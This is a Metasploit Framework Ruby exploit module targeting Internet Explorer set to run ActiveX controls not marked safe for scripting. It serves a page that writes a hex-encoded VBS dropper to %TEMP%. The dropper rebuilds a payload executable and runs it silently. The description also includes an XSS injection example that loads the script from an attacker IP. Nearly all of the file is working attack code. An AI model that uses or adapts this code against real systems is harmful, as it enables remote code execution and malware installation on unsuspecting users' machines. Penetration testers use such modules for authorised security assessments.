##
# $Id: ie_unsafe_scripting.rb 10394 2010-09-20 08:06:27Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpServer::HTML
	include Msf::Exploit::EXE

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Internet Explorer Unsafe Scripting Misconfiguration',
			'Description'    => %q{
				This exploit takes advantage of the "Initialize and script ActiveX controls not
			marked safe for scripting" setting within Internet Explorer.  When this option is set,
			IE allows access to the WScript.Shell ActiveX control, which allows javascript to
			interact with the file system and run commands.  This security flaw is not uncommon
			in corporate environments for the 'Intranet' or 'Trusted Site' zones.  In order to
			save binary data to the file system, ADODB.Stream access is required, which in IE7
			will trigger a cross domain access violation.  As such, we write the code to a .vbs
			file and execute it from there, where no such restrictions exist.

				When set via domain policy, the most common registry entry to modify is HKLM\
			Software\Policies\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\1\1201,
			which if set to '0' forces ActiveX controls not marked safe for scripting to be
			enabled for the Intranet zone.

				This module creates a javascript/html hybrid that will render correctly either
			via a direct GET http://msf-server/ or as a javascript include, such as in:
			http://intranet-server/xss.asp?id="><script%20src=http://10.10.10.10/ie_unsafe_script.js>
			</script>.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'natron'
				],
			'Version'        => '$Revision: 10394 $',
			'References'     =>
				[
					[ 'URL', 'http://support.microsoft.com/kb/182569' ],
					[ 'URL', 'http://blog.invisibledenizen.org/2009/01/ieunsafescripting-metasploit-module.html' ],
				],
			'Payload'        =>
				{
					'Space'           => 2048,
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Automatic', { } ],
				],
			'DefaultOptions' =>
				{
					'HTTP::compression' => 'gzip'
				},
			'DefaultTarget'  => 0))
	end

	def on_request_uri(cli, request)

		#print_status("Starting...");
		# Build out the HTML response page
		var_shellobj		= rand_text_alpha(rand(5)+5);
		var_fsobj		= rand_text_alpha(rand(5)+5);
		var_fsobj_file		= rand_text_alpha(rand(5)+5);
		var_vbsname		= rand_text_alpha(rand(5)+5);
		var_writedir		= rand_text_alpha(rand(5)+5);
		var_exename		= rand_text_alpha(rand(5)+5);
		var_origLoc		= rand_text_alpha(rand(5)+5);
		var_byteArray		= rand_text_alpha(rand(5)+5);
		var_stream		= rand_text_alpha(rand(5)+5);
		var_writestream		= rand_text_alpha(rand(5)+5);
		var_strmConv		= rand_text_alpha(rand(5)+5);

		p = regenerate_payload(cli);
		print_status("Request received from #{cli.peerhost}:#{cli.peerport}...");
		exe = generate_payload_exe({ :code => p.encoded })
		#print_status("Building vbs file...");
		# Build the content that will end up in the .vbs file
		vbs_content	= Rex::Text.to_hex(%Q|Dim #{var_origLoc}, s, #{var_byteArray}
#{var_origLoc} = SetLocale(1033)
|)

		print_status("Encoding payload into vbs/javascript/html...");
		# Drop the exe payload into an ansi string (ansi ensured via SetLocale above)
		# for conversion with ADODB.Stream

		vbs_ary = []
		# The output of this loop needs to be as small as possible since it
		# gets repeated for every byte of the executable, ballooning it by a
		# factor of about 80k (the current size of the exe template).  In its
		# current form, it's down to about 4MB on the wire
		exe.each_byte do |b|
			vbs_ary << Rex::Text.to_hex("s=s&Chr(#{("%d" % b)})\n")
		end
		vbs_content << vbs_ary.join("")

		# Continue with the rest of the vbs file;
		# Use ADODB.Stream to convert from an ansi string to it's byteArray equivalent
		# Then use ADODB.Stream again to write the binary to file.
		#print_status("Finishing vbs...");
		vbs_content << Rex::Text.to_hex(%Q|
Dim #{var_strmConv}, #{var_writedir}, #{var_writestream}
#{var_writedir} = WScript.CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%") & "\\#{var_exename}.exe"

Set #{var_strmConv} = CreateObject("ADODB.Stream")

#{var_strmConv}.Type = 2
#{var_strmConv}.Charset = "x-ansi"
#{var_strmConv}.Open
#{var_strmConv}.WriteText s, 0
#{var_strmConv}.Position = 0
#{var_strmConv}.Type = 1
#{var_strmConv}.SaveToFile #{var_writedir}, 2

SetLocale(#{var_origLoc})|)

		# Encode the vbs_content
		#print_status("Hex encoded vbs_content: #{vbs_content}");

		# Build the javascript that will be served
		js_content  = %Q|
//<html><head></head><body><script>
var #{var_shellobj} = new ActiveXObject("WScript.Shell");
var #{var_fsobj}    = new ActiveXObject("Scripting.FileSystemObject");
var #{var_writedir} = #{var_shellobj}.ExpandEnvironmentStrings("%TEMP%");
var #{var_fsobj_file} = #{var_fsobj}.OpenTextFile(#{var_writedir} + "\\\\" + "#{var_vbsname}.vbs",2,true);

#{var_fsobj_file}.Write(unescape("#{vbs_content}"));
#{var_fsobj_file}.Close();

#{var_shellobj}.run("wscript.exe " + #{var_writedir} + "\\\\" + "#{var_vbsname}.vbs", 1, true);
#{var_shellobj}.run(#{var_writedir} + "\\\\" + "#{var_exename}.exe", 0, false);
#{var_fsobj}.DeleteFile(#{var_writedir} + "\\\\" + "#{var_vbsname}.vbs");
//</script></html>
|

		print_status("Sending exploit html/javascript to #{cli.peerhost}:#{cli.peerport}...");
		print_status("Exe will be #{var_exename}.exe and must be manually removed from the %TEMP% directory on the target.");

		# Transmit the response to the client
		send_response(cli, js_content, { 'Content-Type' => 'text/html' })

		# Handle the payload
		handler(cli)
	end
end